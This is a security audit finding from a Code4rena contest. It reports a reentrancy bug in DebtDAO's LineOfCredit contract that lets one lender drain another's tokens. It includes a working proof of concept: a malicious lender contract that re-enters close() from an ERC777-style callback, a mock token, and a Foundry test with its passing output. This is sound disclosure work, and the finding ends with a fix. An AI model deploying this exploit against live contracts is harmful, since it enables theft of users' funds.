## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- sponsor disputed
- selected for report
- edited-by-warden
- M-05

# [Reentrancy bug allows lender to steal other lenders funds](https://github.com/code-423n4/2022-11-debtdao-findings/issues/160) 

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L487


# Vulnerability details

## Impact

A reentrancy bug allows in `LineOfCredit.sol` allows the lender to steal other lenders tokens if they are lending the same tokens type (loss of funds). 

The  reentrancy occurs in the `_close(credit, id)` function in `LineOfCredit.sol`. The `credit[id]` state variable is cleared only after sendings tokens to the lender. 
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483
```
    function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
        if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }

        // return the Lender's funds that are being repaid
        if (credit.deposit + credit.interestRepaid > 0) {
            LineLib.sendOutTokenOrETH(
                credit.token,
                credit.lender,
                credit.deposit + credit.interestRepaid
            );
        }

        delete credits[id]; // gas refunds

        // remove from active list
        ids.removePosition(id);
        unchecked { --count; }

        // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.
        if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }

        emit CloseCreditPosition(id);

        return true;
    }
```


## Proof of Concept

Reentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions.
Example of a real-world popular token that can change control flow is PNT (pNetwork). 
As the protocol supports any token listed on the oracle, if the oracle currently supports (or will support in the future) a feed of the above tokens, the bug is exploitable.

If a reentrancy occurs in the `_close(credit, id)` function, the `credit[id]` state variable is cleared only after sendings tokens to the lender. 
A lender can abuse this by reentrancy to `close(id)` and retrieve `credit.deposit + credit.interestRepaid` amount of `credit.token`. A lender can repeat this processes as long as LineOfCredit has funds available.

The POC will demonstrate the following flow:
1. Borrower  adds a new credit with lender1 on 1000 tokens.
2. Borrower lends 1000 from lender1
3. Borrower repays debt 
4. Borrower adds a new credit with lender2 on 1000 tokens
5. Borrower closes debt with lender1
6. Lender1 receives 2000 tokens. 

Add the `MockLender.sol` to mock folder.
```
pragma solidity 0.8.9;

import { ILineOfCredit } from "../interfaces/ILineOfCredit.sol";
import { Token777 } from "./Token777.sol";

contract MockLender {
    address owner;
    ILineOfCredit line;
    bytes32 id;
    bool lock;
    
    event GotMoney(uint256 amount);

    constructor(address _line) public {
        line = ILineOfCredit(_line);
        owner = msg.sender;
    }

    function addCredit(
        uint128 drate,
        uint128 frate,
        uint256 amount,
        address token
    ) external {
        require(msg.sender == owner, "Only callable by owner");
        Token777(token).approve(address(line), amount);
        Token777(token).approve(address(owner), type(uint256).max);
        Token777(token).mockAddToRegistry();
        id = line.addCredit(drate, frate, amount, token, address(this));
    }
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        emit GotMoney(amount);
        if(!lock){
            lock = true;
            line.close(id);
        }
    }

    receive() external payable {
    }

}
```

Add `Token777.sol` to mocks folder:

```
pragma solidity 0.8.9;

import "openzeppelin/token/ERC20/ERC20.sol";
interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

contract Token777 is ERC20("Token used to trade", "777") {
    mapping(address => uint256) private _balances;
    mapping(address => address) private registry;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    // ERC20-allowances
    mapping(address => mapping(address => uint256)) private _allowances;

    event Test(address);

    constructor() {
    }

    function mint(address account, uint256 amount) external returns(bool) {
        _mint(account, amount);
        return true;
    }

    function _mint(
        address account,
        uint256 amount
    ) internal virtual override{
        require(account != address(0), "ERC777: mint to the zero address");

        // Update state variables
        _totalSupply += amount;
        _balances[account] += amount;
        emit Test(account);
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 value) public virtual override returns (bool) {
        address holder = _msgSender();
        _approve(holder, spender, value);
        return true;
    }
   function _approve(
        address holder,
        address spender,
        uint256 value
    ) internal  virtual override {
        require(holder != address(0), "ERC777: approve from the zero address");
        require(spender != address(0), "ERC777: approve to the zero address");

        _allowances[holder][spender] = value;
        emit Approval(holder, spender, value);
    }
    function transferFrom(
        address holder,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        emit Test(msg.sender);
        _spendAllowance(holder, spender, amount);
        _send(holder, recipient, amount, "", "", false);
        return true;
    }

    function allowance(address holder, address spender) public view virtual override returns (uint256) {
        return _allowances[holder][spender];
    }
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal override virtual {
        emit Test(msg.sender);
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC777: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _send(_msgSender(), recipient, amount, "", "", false);
        return true;
    }

    function _send(
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) internal virtual {
        require(from != address(0), "ERC777: transfer from the zero address");
        require(to != address(0), "ERC777: transfer to the zero address");

        address operator = _msgSender();

        _move(operator, from, to, amount, userData, operatorData);

        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);
    }


    function _move(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) private {
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC777: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;
    }

    function _callTokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData,
        bool requireReceptionAck
    ) private {
        address implementer = registry[to];
        if (implementer != address(0)) {
            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);
        }
    }

    function mockAddToRegistry() external {
        registry[msg.sender] = msg.sender;
    }

}
```

Add the following imports to `LineOfCredit.t.sol`:

```
import { MockLender } from "../mock/MockLender.sol";
import { Token777 } from "../mock/Token777.sol";
```

Add the following test to `LineOfCredit.t.sol`:

```

    function test_reentrancy() public {
        uint256 lenderOneAmount = 1000;
        uint256 lenderTwoAmount = 1000;
        Token777 tokenUsed = new Token777();
        // Create lenderController 
        address lenderOneController = address(0xdeadbeef);
        address lender2 = address(0x1337);

        // Create lenderContract 
        vm.startPrank(lenderOneController);
        MockLender lenderOneContract = new MockLender(address(line));
        vm.stopPrank();

        // give lenders their lend amount of token
        tokenUsed.mint(address(lenderOneContract), lenderOneAmount);
        tokenUsed.mint(address(lender2), lenderTwoAmount);

        // add support of the token to the SimpleOracle
        oracle.changePrice(address(tokenUsed), 1000 * 1e8); // 1000 USD

        // Borrowers adds credit line from lender2
        vm.startPrank(borrower);
        line.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed), address(lenderOneContract));
        vm.stopPrank();

        // LenderOne adds credit line
        vm.startPrank(lenderOneController);
        lenderOneContract.addCredit(dRate, fRate, lenderOneAmount, address(tokenUsed));
        vm.stopPrank();

        //borrow 1 ether
        bytes32 id_first = line.ids(0);
        vm.startPrank(borrower);
        line.borrow(id_first, lenderOneAmount);
        vm.stopPrank();
        
        // Borrowers adds an additional credit line from lender2
        vm.startPrank(borrower);
        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed), address(lender2));
        vm.stopPrank();

        // Lender2 adds an additional credit line from  
        vm.startPrank(lender2);
        tokenUsed.approve(address(line), lenderTwoAmount);
        line.addCredit(dRate, fRate, lenderTwoAmount, address(tokenUsed),  address(lender2));
        vm.stopPrank();

        // repay all debt to lender 1
        vm.startPrank(borrower);
        tokenUsed.approve(address(line), lenderOneAmount);
        line.depositAndRepay(lenderOneAmount);
        line.close(id_first);
        vm.stopPrank();
        
        //validate that lender1 was able to steal lender2 tokens
        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);
    }
```

To run the POC execute:
`forge test -v`

Expected output:

```
[PASS] test_reentrancy() (gas: 1636410)
Test result: ok. 1 passed; 0 failed; finished in 1.71ms
```

To get full trace execute: 
`forge test -vvvv`

## Tools Used

VS Code, Foundry.

## Recommended Mitigation Steps

Send tokens only at the end of `_close(Credit memory credit, bytes32 id)` or add a reentrancyGuard.